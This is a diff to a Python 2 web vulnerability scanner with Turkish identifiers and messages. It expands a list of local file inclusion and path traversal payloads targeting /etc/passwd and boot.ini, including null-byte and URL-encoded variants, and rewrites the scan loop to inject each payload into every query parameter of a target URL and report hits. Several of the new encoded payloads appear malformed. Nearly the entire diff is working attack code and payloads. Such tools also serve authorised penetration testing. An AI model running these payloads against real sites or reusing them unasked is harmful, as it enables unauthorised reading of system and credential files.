@@ -867,6 +867,7 @@ def lfitara(lfibul):
 	'../../../../../../../../../etc/passwd',
 	'../../../../../../../../../../etc/passwd',
 	'../../../../../../../../../../../etc/passwd',
+        
 	'../etc/passwd%00',
 	'../../etc/passwd%00',
 	'../../../etc/passwd%00',
@@ -878,8 +879,9 @@ def lfitara(lfibul):
 	'../../../../../../../../../etc/passwd%00',
 	'../../../../../../../../../../etc/passwd%00',
 	'../../../../../../../../../../../etc/passwd%00',
+        
 	'boot.ini%00',
-        '.../boot.ini%00',
+        '../boot.ini%00',
 	'../../boot.ini%00',
 	'../../../boot.ini%00',
 	'../../../../boot.ini%00',
@@ -890,8 +892,9 @@ def lfitara(lfibul):
 	'../../../../../../../../../boot.ini%00',
 	'../../../../../../../../../../boot.ini%00',
 	'../../../../../../../../../../../boot.ini%00',
+        
         'boot.ini',
-        '.../boot.ini',
+        '../boot.ini',
         '../../boot.ini',
         '../../../boot.ini',
         '../../../../boot.ini',
@@ -901,23 +904,51 @@ def lfitara(lfibul):
         '../../../../../../../../boot.ini',
         '../../../../../../../../../boot.ini',
         '../../../../../../../../../../boot.ini',
-        '../../../../../../../../../../../boot.ini']
+        '../../../../../../../../../../../boot.ini',
+        
+        "..%2fboot.ini%00",
+        "..2f..%2fboot.ini%00",
+        "..2f..%2f..%2fboot.ini%00",
+        "..2f..%2f..%2f..%2fboot.ini%00",
+        "..2f..%2f..%2f..%2f..%2fboot.ini%00",
+        "..2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
+        "..2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
+        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
+        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
+        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
+        
+        "..%2fetc%2fpasswd%00",
+        "..2f..%2fetc%2fpasswd%00",
+        "..2f..%2f..%2fetc%2fpasswd%00",
+        "..2f..%2f..%2f..%2fetc%2fpasswd%00",
+        "..2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
+        "..2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
+        "..2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
+        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
+        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
+        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00"]
 	
     try:
 	for lfidizin in lfiyollar:
-	    print "LFi Taraniyor ... "
-	    urlnormal=lfiurl.replace("=", "="+lfidizin)
-	    urlac = urllib2.urlopen(urlnormal)
-	    response = temizle(urlac.read())
-	    if "root:" in response or "noexecute=optout" in response:
-		yaz("[#] LFI BULUNDU : " + urlnormal,True)
-	       
+	    for key,value in urlparse.parse_qs(urlparse.urlparse(lfibul).query, True).items():
+		lfilihal={}
+		lfilihal[key]=lfidizin
+		lfiparametre = urllib.urlencode(lfilihal)
+		print lfiparametre
+		print "LFi Taraniyor ... "
+		#urlnormal=lfiurl.replace("=", "="+lfidizin)
+		urlac = urllib2.urlopen(lfibul+"?"+lfiparametre)
+		response = temizle(urlac.read())
+		if "root:" in response or "noexecute=optout" in response:
+		    yaz("[#] LFI BULUNDU : " + lfibul,True)
+		   
+		lfilihal.clear()
     except urllib2.HTTPError,  e:
 	if(e.code==500):
-	    yaz("[#] LFI Http 500 Dondu  / Internal Server Error " +urlnormal,True)
+	    yaz("[#] LFI Http 500 Dondu  / Internal Server Error " +lfibul,True)
     
     except urllib2.URLError,  e:
-	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
+	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,lfibul)
 	    #yaz(mesaj)
     except:
 	mesaj="Bilinmeyen hata olustu\n"
@@ -933,6 +964,8 @@ def lfitest(lfiurl):
 	response = temizle(urlac.read())
 	if "failed to open stream" in response:
 	    yaz("[#] LFI Testi BULUNDU : " + urlnormal,True)
+	    lfitara(lfiurl)
+	else:
 	    lfitara(lfiurl)
 	       
     except urllib2.HTTPError,  e:
@@ -1189,7 +1222,7 @@ def linkler(urltara,host):
 	print "Saglikli tarama icin sitedeki tum linkleri cekiyor lutfen bekleyiniz..."
 	while not queue.empty():
 	    qudekiveri=queue.get()
-	    dahildegil = ("html","html","js","xml","ico","css","gif","jpg","jar","tif","bmp","war","ear","mpg","wmv","mpeg","scm","iso","dmp","dll","cab","so","avi","bin","exe","iso","tar","png","pdf","ps","mp3","zip","rar","gz")
+	    dahildegil = ("xlsx","html","html","js","xml","ico","css","gif","jpg","jar","tif","bmp","war","ear","mpg","wmv","mpeg","scm","iso","dmp","dll","cab","so","avi","bin","exe","iso","tar","png","pdf","ps","mp3","zip","rar","gz")
 	    
 	    linkopener = urllib2.build_opener(HTTPAYAR,urllib2.HTTPSHandler(),urllib2.HTTPCookieProcessor())
 	    linkopener.addheaders = [
